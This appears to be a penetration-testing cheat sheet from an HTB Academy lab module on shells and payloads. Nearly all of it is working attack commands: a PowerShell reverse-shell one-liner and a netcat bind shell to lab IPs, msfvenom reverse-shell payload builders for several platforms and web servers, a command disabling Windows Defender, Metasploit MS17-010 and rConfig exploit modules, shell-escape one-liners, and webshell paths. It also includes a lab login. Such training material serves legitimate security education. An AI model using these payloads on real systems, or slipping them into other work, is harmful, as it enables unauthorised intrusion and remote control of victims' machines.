# SHELLS & PAYLOADS

## Windows

- **[xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface)**: CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.
- **[env](https://man7.org/linux/man-pages/man1/env.1.html)**: Works with many different command language interpreters to discover the environmental variables of a system.
- **[sudo nc -lvnp <port #>](https://linux.die.net/man/1/nc)**: Starts a netcat listener on a specified port.
- **[nc -nv <ip address of computer with listener started><port being listened on>](https://linux.die.net/man/1/nc)**: Connects to a netcat listener at the specified IP address and port.

## PowerShell

- **[Set-MpPreference -DisableRealtimeMonitoring $true](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference)**: PowerShell command using to disable real-time monitoring in Windows Defender.
- **[use exploit/windows/smb/psexec](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec)**: Metasploit exploit module that can be used on vulnerable Windows systems to establish a shell session utilizing SMB and PsExec.

## Shell Payloads

- **[rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f](https://linux.die.net/man/1/nc)**: Uses netcat to bind a shell (/bin/bash) to the specified IP address and port, allowing for a remote shell session.
- **[powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-expressions?view=powershell-7.2)**: Powershell one-liner used to connect back to a listener that has been started on an attack box.
- **[msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate a Linux-based reverse shell stageless payload.

## More Payloads

- **[msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate a Windows-based reverse shell stageless payload.
- **[msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate a MacOS-based reverse shell payload.
- **[msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate an ASP web reverse shell payload.
- **[msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate a JSP web reverse shell payload.
- **[msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war](https://www.offensive-security.com/metasploit-unleashed/msfvenom)**: MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload.
- **[use auxiliary/scanner/smb/smb_ms17_010](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010)**: Metasploit exploit module used to check if a host is vulnerable to MS17-010.
- **[use exploit/windows/smb/ms17_010_psexec](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec)**: Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to MS17-010.
- **[use exploit/linux/http/rconfig_vendors_auth_file_upload_rce](https://www.rapid7.com/db/modules/exploit/linux/http/rconfig_vendors_auth_file_upload_rce)**: Metasploit exploit module that can be used to obtain a reverse shell on a vulnerable Linux system hosting rConfig 3.9.6.

## Interactive Shell Commands

- **[python -c 'import pty; pty.spawn("/bin/sh")'](https://docs.python.org/3/library/pty.html)**: Python command used to spawn an interactive shell on a Linux-based system.
- **[/bin/sh -i](https://linux.die.net/man/1/sh)**: Spawns an interactive shell on a Linux-based system.
- **[perl -e 'exec "/bin/sh";'](https://www.perl.com/)**: Uses Perl to spawn an interactive shell on a Linux-based system.
- **[ruby: exec "/bin/sh"](https://www.ruby-lang.org/)**: Uses Ruby to spawn an interactive shell on a Linux-based system.
- **[Lua: os.execute('/bin/sh')](https://www.lua.org/)**: Uses Lua to spawn an interactive shell on a Linux-based system.
- **[awk 'BEGIN {system("/bin/sh")}'**](https://linux.die.net/man/1/awk)**: Uses awk command to spawn an interactive shell on a Linux-based system.
- **[find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;](https://linux.die.net/man/1/find)**: Uses find command to spawn an interactive shell on a Linux-based system.
- **[find . -exec /bin/sh \; -quit](https://linux.die.net/man/1/find)**: An alternative way to use the find command to spawn an interactive shell on a Linux-based system.
- **[vim -c ':!/bin/sh'](https://www.vim.org/)**: Uses the text editor VIM to spawn an interactive shell. Can be used to escape "jail shells".
- **[ls -la <path/to/fileorbinary>](https://linux.die.net/man/1/ls)**: Used to list files & directories on a Linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute.
- **[sudo -l](https://linux.die.net/man/8/sudo)**: Displays the commands that the currently logged-on user can run as sudo.

## Webshells

- **[/usr/share/webshells/laudanum](https://tools.kali.org/exploitation-tools/laudanum)**: Location of laudanum webshells on ParrotOS and Pwnbox.
- **[/usr/share/nishang/Antak-WebShell](https://github.com/samratashok/nishang)**: Location of Antak-Webshell on Parrot OS and Pwnbox.
